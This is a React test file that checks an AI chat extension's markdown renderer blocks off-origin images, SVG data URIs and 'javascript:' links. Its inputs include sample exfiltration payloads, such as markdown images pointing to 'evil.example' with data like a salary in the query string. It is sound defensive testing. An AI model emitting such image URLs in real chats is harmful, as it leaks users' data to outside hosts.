import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router';
import { describe, expect, it } from 'vitest';

import { Markdown } from '../../client/components/talent/markdown';
import { MarkdownMessage } from '../../client/extensions/nocobase-ai/components/chat/markdown-message';
import { isSafeImageSrc } from '../../client/extensions/nocobase-ai/shared/safe-markdown-urls';

const PNG = 'data:image/png;base64,iVBORw0KGgo=';

describe('Markdown images (readiness review 2026-10-07)', () => {
  it('accepts only same-origin and inline raster images', () => {
    expect(isSafeImageSrc('/main/api/files/1')).toBe(true);
    expect(isSafeImageSrc(`${window.location.origin}/a.png`)).toBe(true);
    expect(isSafeImageSrc(PNG)).toBe(true);
    expect(isSafeImageSrc('https://evil.example/?d=secret')).toBe(false);
    expect(isSafeImageSrc('//evil.example/x.png')).toBe(false);
    expect(isSafeImageSrc('\\\\evil.example/x.png')).toBe(false);
    expect(isSafeImageSrc('data:image/svg+xml,<svg/>')).toBe(false);
    expect(isSafeImageSrc('javascript:alert(1)')).toBe(false);
  });

  it('shows another origin’s image in the chat as a link, not an image', () => {
    const { container } = render(
      <MarkdownMessage>
        {`see ![salary](https://evil.example/?d=12000) and ![logo](/main/logo.png) and ![dot](${PNG})`}
      </MarkdownMessage>,
    );
    const images = [...container.querySelectorAll('img')].map((image) =>
      image.getAttribute('src'),
    );
    expect(images).toEqual(['/main/logo.png', PNG]);
    expect(
      screen.getByRole('link', { name: 'https://evil.example/?d=12000' }),
    ).toHaveAttribute('href', 'https://evil.example/?d=12000');
  });

  it('drops javascript: links in the chat', () => {
    const { container } = render(
      <MarkdownMessage>{'[click](javascript:alert(1))'}</MarkdownMessage>,
    );
    expect(container.innerHTML).not.toContain('javascript:');
  });

  it('applies the same rule to documents and reports', () => {
    const { container } = render(
      <MemoryRouter>
        <Markdown>
          {
            '![x](https://evil.example/p.png) ![y](/main/y.png) [z](javascript:alert(1))'
          }
        </Markdown>
      </MemoryRouter>,
    );
    expect(
      [...container.querySelectorAll('img')].map((image) =>
        image.getAttribute('src'),
      ),
    ).toEqual(['/main/y.png']);
    expect(container.innerHTML).toContain('https://evil.example/p.png');
    expect(container.innerHTML).not.toContain('javascript:');
  });
});
